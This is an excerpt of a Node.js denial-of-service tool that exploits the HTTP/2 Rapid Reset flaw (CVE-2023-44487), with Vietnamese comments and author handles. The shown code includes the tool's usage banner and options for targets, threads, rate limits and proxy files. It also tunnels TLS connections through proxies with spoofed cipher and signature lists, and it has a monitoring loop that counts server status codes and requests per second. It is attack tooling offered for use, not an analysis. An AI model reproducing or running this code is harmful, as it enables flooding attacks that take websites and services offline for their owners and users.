...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.error(`
${'          Methods Flood by @xevip0- HTTP/2 RapidRest STREAM (CVE-2023-44487)'.bold.red.underline}
${'                            Cập nhật: [ 18/06/2025 ]'.gray.underline}
...
${'Tùy chọn:'.yellow.underline}
  ...
  ${'--delay <1-1000>'.green} Độ tr Find a way to delay between requests 1-100 ms
    ...
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                ...
                servername: url.host,
                ciphers: 'TLS_AES_128_CCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256:TLS_DHE_RSA_WITH_AES_256_GCM_SHA384:TLS_DHE_RSA_WITH_AES_128_GCM_SHA256:TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp384r1_sha384:ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
...
if (cluster.isMaster) {
    ...
    console.log(`†Attack Start /  Winter love❤️ you <3 / @smsking1999 †`);
    ...
    if (debugMode) {
        setInterval(() => {
            ...
            // Tạo object JSON chỉ chứa statuses và totalRPS
            const debugOutput = {
                statuses: sortedStatuses.reduce((acc, [code, count]) => {
                    acc[code] = count;
                    return acc;
                }, {}),
                totalRPS: total
            ...
            // Định dạng JSON ngang (one-line)
            let outputString = JSON.stringify(debugOutput);
            // Thêm màu sắc cho các status code
            for (const [code, count] of sortedStatuses) {
                let coloredCode;
                if (code === 'GOAWAY') {
                    coloredCode = code.magenta;
                } else if (code.startsWith('2')) {
                    coloredCode = code.green;
                } else if (code.startsWith('4')) {
                    coloredCode = code.yellow;
                } else if (code.startsWith('5')) {
                    coloredCode = code.red;
                } else {
                    coloredCode = code.gray;
                }
                outputString = outputString.replace(`"${code}"`, `"${coloredCode}"`);
            }

            // In thời gian Việt Nam và JSON ngang
            console.log(`${currentTime.cyan}: ${outputString.replace(/("[0-9]+": [0-9]+)/g, (match) => match.white)}`);
        }, 1000);
    }
